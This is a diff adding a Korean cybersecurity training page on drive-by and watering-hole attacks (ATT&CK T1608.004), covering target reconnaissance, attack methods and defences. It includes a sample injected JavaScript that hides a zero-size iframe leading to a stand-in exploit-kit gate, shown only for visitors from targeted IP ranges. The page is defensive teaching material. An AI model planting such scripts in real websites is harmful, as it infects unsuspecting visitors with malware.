@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="ko" class="light" data-technique-id="T1608.004">
+<head>
+    <script>(function(){if(new URLSearchParams(window.location.search).get('preview')==='1')return;try{var k='sb-bnwbybawqrnhznirivfg-auth-token';var s=localStorage.getItem(k);if(!s||!JSON.parse(s)){window.location.replace('/login?redirect='+encodeURIComponent(window.location.href));}}catch(e){window.location.replace('/login');}})();</script>
+    <script>var _eduDynLoaded=false;(async function(){try{var S='https://bnwbybawqrnhznirivfg.supabase.co';var K='sb_publishable_fiXeTnAxpTatUSnC0ZvOWg_x5eSbL1w';var r=await fetch(S+'/rest/v1/edu_html_content?page_id=eq.t1608-004-drive-by-target&select=content&limit=1',{headers:{'apikey':K,'Authorization':'Bearer '+K}});if(r.ok){var d=await r.json();if(d&&d.length>0&&d[0].content){_eduDynLoaded=true;document.open();document.write(d[0].content);document.close();return;}}}catch(e){}document.documentElement.classList.add('edu-ready');})();setTimeout(function(){if(!_eduDynLoaded)document.documentElement.classList.add('edu-ready');},3000);</script>
+    <style>html:not(.edu-ready) body{visibility:hidden;}html.edu-ready body{visibility:visible;}</style>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="description" content="(주)갓루트(GOTROOT) 사이버보안 교육 — T1608.004 Drive-by 타겟">
+    <meta name="author" content="(주)갓루트 GOTROOT">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; frame-src 'none'; object-src 'none'; base-uri 'self';" />
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" /><meta name="referrer" content="strict-origin-when-cross-origin" />
+    <title>GOTROOT EDU | T1608.004 Drive-by 타겟 — (주)갓루트 사이버보안 교육</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config={darkMode:'class',theme:{extend:{fontFamily:{sans:['Inter','sans-serif'],mono:['JetBrains Mono','monospace']},colors:{cbg:'#FFF8F0',cyel:'#F4D06F',cteal:'#9DD9D2',cdark:'#1e293b',cgray:'#475569',slate:{850:'#151e2e',900:'#0f172a',950:'#020617'}}}}}</script>
+    <style>body{scroll-behavior:smooth;background-color:#FFF8F0;color:#1e293b;transition:background-color .3s,color .3s;}.glass-panel{background:rgba(255,255,255,0.7);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid rgba(157,217,210,0.5);box-shadow:0 8px 32px rgba(30,41,59,0.05);}.dark body{background-color:#0f172a;color:#f8fafc;}.dark .glass-panel{background:rgba(30,41,59,0.7);border:1px solid rgba(244,208,111,0.2);}.hl-teal{color:#0f766e;font-weight:700;}.dark .hl-teal{color:#9DD9D2;}.hl-yel{color:#b45309;font-weight:700;}.dark .hl-yel{color:#F4D06F;}.nav-item.active{background:linear-gradient(90deg,rgba(157,217,210,0.3) 0%,transparent 100%);border-left:4px solid #9DD9D2;color:#0f766e;font-weight:700;}.dark .nav-item.active{background:linear-gradient(90deg,rgba(244,208,111,0.2) 0%,transparent 100%);border-left:4px solid #F4D06F;color:#F4D06F;}.terminal-bg{background-color:#1e293b;color:#9DD9D2;font-family:'JetBrains Mono',monospace;}::-webkit-scrollbar{width:8px;}::-webkit-scrollbar-thumb{background:#9DD9D2;border-radius:4px;}.dark ::-webkit-scrollbar-thumb{background:#F4D06F;}</style>
+</head>
+<body class="flex flex-col h-screen overflow-hidden selection:bg-[#9DD9D2] selection:text-[#1e293b] transition-colors duration-300">
+    <div class="w-full px-4 py-1.5 flex items-center justify-between border-b border-slate-200 dark:border-slate-700 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm shrink-0 z-[60]" style="font-family:'JetBrains Mono',monospace;"><div class="flex items-center gap-2"><span style="font-size:9px;font-weight:900;color:#bb3e03;letter-spacing:0.25em;">GOTROOT</span><span style="font-size:8px;color:#94a3b8;">|</span><span style="font-size:8px;color:#64748b;" class="hidden sm:inline">(주)갓루트 · 사이버보안 교육 플랫폼</span></div><div class="flex items-center gap-3"><button onclick="window.location.href='/'" style="font-size:8px;color:#bb3e03;background:transparent;border:1px solid rgba(187,62,3,0.3);padding:3px 10px;border-radius:4px;cursor:pointer;font-family:inherit;">← 매트릭스 대시보드</button></div></div>
+    <div class="flex flex-1 overflow-hidden">
+    <button onclick="toggleTheme()" class="fixed top-12 right-6 z-50 p-3 rounded-full glass-panel hover:scale-110 transition-transform shadow-lg border border-[#9DD9D2]"><span id="theme-icon" class="text-xl">🌙</span></button>
+    <aside class="w-64 glass-panel border-r border-[#9DD9D2]/30 h-full flex flex-col hidden md:flex shrink-0 z-40">
+        <div class="p-6 border-b border-[#9DD9D2]/30"><button onclick="window.location.href='/'" class="flex items-center gap-1.5 text-xs text-slate-500 hover:text-teal-700 mb-4 transition-colors group"><span class="group-hover:-translate-x-0.5 transition-transform">←</span><span>대시보드로 돌아가기</span></button><h1 class="text-xl font-bold font-mono hl-teal tracking-tighter">ATT&CK Matrix</h1><p class="text-xs text-cgray dark:text-slate-400 mt-2">T1608.004: Drive-by 타겟</p></div>
+        <nav class="flex-1 overflow-y-auto py-4" id="sidebar-nav">
+            <button onclick="go('ch1')" class="nav-item active w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400" data-target="ch1">1. Drive-by 공격 개요</button>
+            <button onclick="go('ch2')" class="nav-item w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400" data-target="ch2">2. 워터링홀 구성</button>
+            <button onclick="go('ch3')" class="nav-item w-full text-left px-6 py-3 text-sm transition-colors text-cgray dark:text-slate-400" data-target="ch3">3. 탐지와 방어</button>
+        </nav>
+    </aside>
+    <main class="flex-1 overflow-y-auto h-full relative scroll-smooth" id="main-scroll">
+        <div class="max-w-4xl mx-auto p-6 md:p-12 pb-24 space-y-32">
+            <header class="text-center pt-8">
+                <div class="inline-block px-4 py-1 rounded-full bg-[#F4D06F]/20 border border-[#F4D06F] hl-yel font-mono text-sm mb-4">Resource Development</div>
+                <h2 class="text-4xl md:text-5xl font-extrabold tracking-tight mb-4">T1608.004<br><span class="hl-teal">Drive-by 타겟</span></h2>
+                <p class="text-lg text-cgray dark:text-slate-400 max-w-2xl mx-auto">피해자가 방문할 가능성이 높은 웹사이트를 타협하거나 악성 콘텐츠를 삽입하여 Drive-by 다운로드/Exploit을 배치하는 기법을 학습합니다.</p>
+            </header>
+
+            <section id="ch1" class="section-observe space-y-8 scroll-mt-20">
+                <h3 class="text-2xl font-bold hl-teal">🌊 Chapter 1 — Drive-by 공격 개요</h3>
+                <div class="glass-panel rounded-2xl p-8 space-y-6">
+                    <p>Drive-by 공격은 사용자가 <span class="hl-teal">정상 웹사이트를 방문하는 것만으로</span> 악성코드에 감염되는 기법입니다. 공격자는 타겟 조직의 구성원이 자주 방문하는 웹사이트를 파악하고, 해당 사이트에 악성 코드를 삽입합니다.</p>
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cteal/20">
+                            <h5 class="font-bold text-sm hl-teal mb-2">워터링홀 공격 (Watering Hole)</h5>
+                            <ul class="text-sm space-y-1 text-cgray dark:text-slate-400">
+                                <li>- 타겟 업계 포럼/뉴스 사이트 해킹</li>
+                                <li>- 관련 콘퍼런스/학회 웹사이트 변조</li>
+                                <li>- 업무용 SaaS 서비스 서드파티 스크립트 오염</li>
+                                <li>- 특정 지역/언어 웹사이트 타겟팅</li>
+                            </ul>
+                        </div>
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cyel/20">
+                            <h5 class="font-bold text-sm hl-yel mb-2">Drive-by 페이로드 유형</h5>
+                            <ul class="text-sm space-y-1 text-cgray dark:text-slate-400">
+                                <li>- 브라우저 Exploit Kit (RIG, Magnitude)</li>
+                                <li>- 악성 JavaScript 주입</li>
+                                <li>- iframe 리다이렉트</li>
+                                <li>- 가짜 소프트웨어 업데이트 팝업</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+                        <p class="text-slate-500"># 워터링홀 타겟 분석 — 방위산업 종사자 대상</p>
+                        <p class="text-cyel">$ python3 watering_hole_recon.py --target "defense-industry" --country "KR"</p>
+                        <p>[*] Analyzing browsing patterns of defense industry employees...</p>
+                        <p>[1] defense-forum[.]kr — Monthly visitors: 45,000 — <span class="text-green-400">CMS: WordPress 5.8</span></p>
+                        <p>[2] military-tech-news[.]co[.]kr — Monthly visitors: 28,000 — <span class="text-green-400">CMS: Drupal 9</span></p>
+                        <p>[3] aerospace-conference[.]org — Monthly visitors: 12,000 — <span class="text-red-400">Outdated: jQuery 1.x</span></p>
+                        <p>[4] defense-procurement[.]go[.]kr — Monthly visitors: 8,500 — <span class="text-green-400">Gov framework</span></p>
+                        <p class="text-cyel mt-2">[+] Target selected: aerospace-conference[.]org (outdated jQuery, vulnerable to XSS)</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch2" class="section-observe space-y-8 scroll-mt-20">
+                <h3 class="text-2xl font-bold hl-teal">⚡ Chapter 2 — 워터링홀 구성</h3>
+                <div class="glass-panel rounded-2xl p-8 space-y-6">
+                    <div class="space-y-4">
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cteal/20">
+                            <h5 class="font-bold hl-teal mb-2">JavaScript 주입 공격</h5>
+                            <p class="text-sm text-cgray dark:text-slate-400">해킹한 웹사이트에 악성 JavaScript를 삽입하여 방문자의 브라우저를 프로파일링하고, 타겟 조건(IP 대역, 브라우저, OS)에 맞으면 Exploit을 전달합니다. 조건에 맞지 않는 방문자에게는 정상 페이지를 보여줍니다.</p>
+                        </div>
+                        <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+                            <p class="text-slate-500"># 해킹된 사이트에 삽입된 악성 JavaScript — 조건부 리다이렉트</p>
+                            <p class="text-cyel"># injected_payload.js (난독화 전)</p>
+                            <p class="text-slate-300">(function(){</p>
+                            <p class="text-slate-300">  var targetIPs = ['203.0.113.0/24','198.51.100.0/24']; <span class="text-slate-500">// 방위산업 IP대역</span></p>
+                            <p class="text-slate-300">  var xhr = new XMLHttpRequest();</p>
+                            <p class="text-slate-300">  xhr.open('GET','https://api.ipify.org?format=json',true);</p>
+                            <p class="text-slate-300">  xhr.onload = function(){</p>
+                            <p class="text-slate-300">    var ip = JSON.parse(xhr.responseText).ip;</p>
+                            <p class="text-slate-300">    if(matchCIDR(ip, targetIPs)){</p>
+                            <p class="text-red-400">      // 타겟 → Exploit Kit으로 리다이렉트</p>
+                            <p class="text-red-400">      var iframe = document.createElement('iframe');</p>
+                            <p class="text-red-400">      iframe.src = 'https://cdn-update[.]com/gate.php';</p>
+                            <p class="text-red-400">      iframe.style.cssText = 'width:0;height:0;border:0;';</p>
+                            <p class="text-red-400">      document.body.appendChild(iframe);</p>
+                            <p class="text-slate-300">    }</p>
+                            <p class="text-slate-300">  }; xhr.send();</p>
+                            <p class="text-slate-300">})();</p>
+                        </div>
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cyel/20">
+                            <h5 class="font-bold hl-yel mb-2">가짜 업데이트 페이지</h5>
+                            <p class="text-sm text-cgray dark:text-slate-400">SocGholish 계열 공격은 웹사이트 방문 시 "브라우저 업데이트 필요" 또는 "Flash Player 업데이트"를 가장한 팝업을 표시합니다. 사용자가 다운로드하면 RAT 또는 로더가 실행됩니다. 최근에는 가짜 CAPTCHA 챌린지 형태도 등장했습니다.</p>
+                        </div>
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cteal/20">
+                            <h5 class="font-bold hl-teal mb-2">서드파티 스크립트 공급망 공격</h5>
+                            <p class="text-sm text-cgray dark:text-slate-400">타겟 사이트가 로드하는 외부 JavaScript(광고 SDK, 분석 도구, 채팅 위젯)의 CDN을 해킹하면, 해당 스크립트를 사용하는 모든 사이트에 악성코드를 배포할 수 있습니다. Magecart 그룹이 결제 페이지에서 이 기법을 광범위하게 사용했습니다.</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch3" class="section-observe space-y-8 scroll-mt-20">
+                <h3 class="text-2xl font-bold hl-teal">🛡️ Chapter 3 — 탐지와 방어</h3>
+                <div class="glass-panel rounded-2xl p-8 space-y-6">
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cteal/20">
+                            <h5 class="font-bold text-sm hl-teal mb-2">네트워크 기반 탐지</h5>
+                            <ul class="text-sm space-y-1 text-cgray dark:text-slate-400">
+                                <li>- DNS 시크홀/RPZ로 알려진 Exploit Kit 차단</li>
+                                <li>- SSL 복호화를 통한 숨겨진 iframe 탐지</li>
+                                <li>- 브라우저 트래픽의 비정상 리다이렉트 체인 분석</li>
+                                <li>- CSP 위반 보고서 모니터링</li>
+                            </ul>
+                        </div>
+                        <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cyel/20">
+                            <h5 class="font-bold text-sm hl-yel mb-2">엔드포인트 방어</h5>
+                            <ul class="text-sm space-y-1 text-cgray dark:text-slate-400">
+                                <li>- 브라우저 자동 업데이트 및 패치 관리</li>
+                                <li>- 브라우저 격리(Browser Isolation) 솔루션</li>
+                                <li>- 스크립트 실행 제어 (WDAC/AppLocker)</li>
+                                <li>- EDR의 브라우저 프로세스 모니터링</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-cteal/20">
+                        <h5 class="font-bold text-sm hl-teal mb-2">웹 보안 게이트웨이 (SWG)</h5>
+                        <p class="text-sm text-cgray dark:text-slate-400">SWG는 직원의 웹 트래픽을 프록시하여 악성 사이트 접근을 차단합니다. URL 필터링, 콘텐츠 검사, SSL 복호화를 통해 Drive-by 공격을 사전 차단할 수 있습니다. 클라우드 기반 SWG는 원격 근무자도 보호합니다.</p>
+                    </div>
+                    <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+                        <p class="text-slate-500"># CSP 헤더 + SRI 적용 — 서드파티 스크립트 변조 방지</p>
+                        <p class="text-cyel">Content-Security-Policy:</p>
+                        <p>  default-src 'self';</p>
+                        <p>  script-src 'self' 'sha256-abc123...' https://trusted-cdn.com;</p>
+                        <p>  frame-src 'none';</p>
+                        <p>  report-uri /csp-report;</p>
+                        <p class="mt-2 text-cyel">&lt;script src="https://trusted-cdn.com/analytics.js"</p>
+                        <p>  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"</p>
+                        <p>  crossorigin="anonymous"&gt;&lt;/script&gt;</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+    </div>
+    <script src="/edu/lab-link.js"></script>
+    <script src="/edu/progress-tracker.js"></script>
+<script src="/edu/breadcrumb.js"></script>
+    <script>
+    function toggleTheme(){document.documentElement.classList.toggle('dark');var ic=document.getElementById('theme-icon');ic.textContent=document.documentElement.classList.contains('dark')?'☀️':'🌙';}
+    function go(id){var el=document.getElementById(id);if(el)el.scrollIntoView({behavior:'smooth'});}
+    var obs=new IntersectionObserver(function(entries){entries.forEach(function(e){if(e.isIntersecting){var id=e.target.id;document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');if(n.getAttribute('data-target')===id)n.classList.add('active');});}});},{root:document.getElementById('main-scroll'),threshold:0.3});
+    document.querySelectorAll('.section-observe').forEach(function(s){obs.observe(s);});
+    </script>
+</body>
+</html>
